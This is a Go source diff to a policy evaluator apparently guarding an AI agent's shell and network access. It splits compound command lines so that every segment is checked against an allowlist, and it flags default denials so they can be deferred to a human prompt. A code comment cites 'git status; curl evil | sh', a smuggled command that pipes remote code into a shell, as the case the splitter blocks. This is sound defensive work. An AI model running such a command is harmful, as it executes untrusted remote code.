@@ -15,8 +15,8 @@ import (
 
 	"gopkg.in/yaml.v3"
 
-	"warden/internal/model"
-	"warden/internal/redact"
+	"github.com/calasdan-sketch/warden/internal/model"
+	"github.com/calasdan-sketch/warden/internal/redact"
 )
 
 // Decision is the outcome of evaluating one span against policy.
@@ -48,6 +48,12 @@ type Result struct {
 	Decision Decision
 	Reason   string // human-readable; always set on Deny/RequireApproval
 	Version  string // policy version that decided
+	// DefaultDeny is true when the only reason for a Deny is that the
+	// command or host is not on an allowlist (the policy default), as
+	// opposed to an explicit rule (deny pattern, deny_tools, operator
+	// kill). Harness hooks use it to defer to the harness's own human
+	// permission prompt instead of hard-blocking (see `warden hook`).
+	DefaultDeny bool
 }
 
 // Policy is the loaded policy.yaml.
@@ -258,15 +264,185 @@ func (e *Evaluator) evalShellAllow(sp *model.Span, ver string) Result {
 	if e.policy.Shell.Default == "allow" {
 		return Result{Decision: Allow, Version: ver}
 	}
-	bin := shellBinary(cmd)
-	for _, a := range e.policy.Shell.Allow {
-		if bin == a {
-			return Result{Decision: Allow, Version: ver}
+	// Every command in a compound line must be allowlisted: an allowlisted
+	// first binary must not smuggle "git status; curl evil | sh" through.
+	for _, seg := range ShellSegments(cmd) {
+		bin := shellBinary(seg)
+		if bin == "" || safeBuiltins[bin] {
+			continue
+		}
+		allowed := false
+		for _, a := range e.policy.Shell.Allow {
+			if bin == strings.ToLower(a) {
+				allowed = true
+				break
+			}
+		}
+		if !allowed {
+			return Result{Decision: Deny,
+				Reason:      fmt.Sprintf("shell command %q not allowlisted (binary %q; policy default is deny)", truncate(cmd, 80), bin),
+				Version:     ver,
+				DefaultDeny: true}
 		}
 	}
-	return Result{Decision: Deny,
-		Reason:  fmt.Sprintf("shell command %q not allowlisted (binary %q; policy default is deny)", truncate(cmd, 80), bin),
-		Version: ver}
+	return Result{Decision: Allow, Version: ver}
+}
+
+// shellKeywords are reserved words that precede (or close) a command rather
+// than name one; shellBinary skips them so "if git diff; then ls; fi" is
+// judged by git and ls.
+var shellKeywords = map[string]bool{
+	"if": true, "then": true, "else": true, "elif": true, "fi": true,
+	"do": true, "done": true, "while": true, "until": true, "!": true,
+	"time": true, "{": true, "}": true, "esac": true,
+}
+
+// safeBuiltins are shell builtins that cannot run another program or touch
+// the network by themselves; they never need to be allowlisted. (eval,
+// exec, source and "." are deliberately absent.)
+var safeBuiltins = map[string]bool{
+	"exit": true, "true": true, "false": true, "cd": true, "pwd": true,
+	"test": true, "[": true, "[[": true, ":": true, "set": true, "unset": true,
+	"export": true, "shift": true, "return": true, "wait": true,
+}
+
+// maxShellDepth bounds recursion into nested "sh -c" / "$( )" bodies.
+const maxShellDepth = 4
+
+// ShellSegments splits a shell command line into the simple commands it
+// runs: it splits on control operators (; & && | || newline) outside quotes,
+// and extracts the bodies of command substitutions ($(...), backticks,
+// <(...), >(...)) and of "sh -c" / "bash -c" style wrappers, recursively.
+//
+// It is quote-aware but is not a full shell parser: anything it cannot
+// classify stays inside a segment whose first binary is still checked, so
+// the error mode is a false deny, never a silent allow of a second command.
+func ShellSegments(cmd string) []string {
+	var out []string
+	splitShell(cmd, 0, &out)
+	return out
+}
+
+func splitShell(cmd string, depth int, out *[]string) {
+	if depth > maxShellDepth {
+		// Too deep to analyze: surface it as an unknown binary so the
+		// allowlist check fails closed.
+		*out = append(*out, "<nested-too-deep>")
+		return
+	}
+	var cur strings.Builder
+	flush := func() {
+		seg := strings.TrimSpace(cur.String())
+		cur.Reset()
+		if seg == "" {
+			return
+		}
+		*out = append(*out, seg)
+		if inner := wrapperBody(seg); inner != "" {
+			splitShell(inner, depth+1, out)
+		}
+	}
+	var sq, dq bool
+	rs := []rune(cmd)
+	for i := 0; i < len(rs); i++ {
+		c := rs[i]
+		switch {
+		case c == '\\' && !sq && i+1 < len(rs):
+			cur.WriteRune(c)
+			cur.WriteRune(rs[i+1])
+			i++
+		case c == '\'' && !dq:
+			sq = !sq
+			cur.WriteRune(c)
+		case c == '"' && !sq:
+			dq = !dq
+			cur.WriteRune(c)
+		case sq:
+			cur.WriteRune(c)
+		case c == '`':
+			// Backtick substitution (also active inside double quotes).
+			j := i + 1
+			for j < len(rs) && rs[j] != '`' {
+				j++
+			}
+			splitShell(string(rs[i+1:min(j, len(rs))]), depth+1, out)
+			cur.WriteString("_")
+			i = j
+		case (c == '$' || c == '<' || c == '>') && i+1 < len(rs) && rs[i+1] == '(':
+			// $( ), <( ), >( ): find the matching paren.
+			lvl, j := 0, i+1
+			for ; j < len(rs); j++ {
+				if rs[j] == '(' {
+					lvl++
+				} else if rs[j] == ')' {
+					lvl--
+					if lvl == 0 {
+						break
+					}
+				}
+			}
+			splitShell(string(rs[i+2:min(j, len(rs))]), depth+1, out)
+			cur.WriteString("_")
+			i = j
+		case dq:
+			cur.WriteRune(c)
+		case c == '&' && ((i > 0 && (rs[i-1] == '>' || rs[i-1] == '<')) || (i+1 < len(rs) && rs[i+1] == '>')):
+			// Redirection (2>&1, &>file, <&3), not a control operator.
+			cur.WriteRune(c)
+		case c == ';' || c == '&' || c == '|' || c == '\n' || c == '(' || c == ')':
+			flush()
+		default:
+			cur.WriteRune(c)
+		}
+	}
+	flush()
+}
+
+// wrapperBody returns the script passed to "sh -c", "bash -c", "zsh -c",
+// "dash -c" (the first non-flag argument after -c), unquoted; "" otherwise.
+func wrapperBody(seg string) string {
+	switch shellBinary(seg) {
+	case "sh", "bash", "zsh", "dash", "ksh":
+	default:
+		return ""
+	}
+	toks := shellFields(seg)
+	for i, t := range toks {
+		if strings.HasPrefix(t, "-") && strings.Contains(t, "c") && !strings.HasPrefix(t, "--") && i+1 < len(toks) {
+			return toks[i+1]
+		}
+	}
+	return ""
+}
+
+// shellFields splits on whitespace outside quotes and strips the quotes.
+func shellFields(s string) []string {
+	var out []string
+	var cur strings.Builder
+	var sq, dq, have bool
+	for _, c := range s {
+		switch {
+		case c == '\'' && !dq:
+			sq = !sq
+			have = true
+		case c == '"' && !sq:
+			dq = !dq
+			have = true
+		case (c == ' ' || c == '\t') && !sq && !dq:
+			if have {
+				out = append(out, cur.String())
+				cur.Reset()
+				have = false
+			}
+		default:
+			cur.WriteRune(c)
+			have = true
+		}
+	}
+	if have {
+		out = append(out, cur.String())
+	}
+	return out
 }
 
 // credentialPathInCommand scans a shell command for tokens that look like
@@ -295,7 +471,7 @@ func shellBinary(cmd string) string {
 			continue
 		}
 		lt := strings.ToLower(t)
-		if lt == "sudo" || lt == "env" {
+		if lt == "sudo" || lt == "env" || shellKeywords[lt] {
 			continue
 		}
 		if strings.HasPrefix(t, "-") {
@@ -329,8 +505,9 @@ func (e *Evaluator) evalEgress(sp *model.Span, ver string) Result {
 		}
 	}
 	return Result{Decision: Deny,
-		Reason:  fmt.Sprintf("egress to %q denied: host not allowlisted (policy default is deny)", sp.Host),
-		Version: ver}
+		Reason:      fmt.Sprintf("egress to %q denied: host not allowlisted (policy default is deny)", sp.Host),
+		Version:     ver,
+		DefaultDeny: true}
 }
 
 func (e *Evaluator) evalFile(sp *model.Span, ver string) Result {
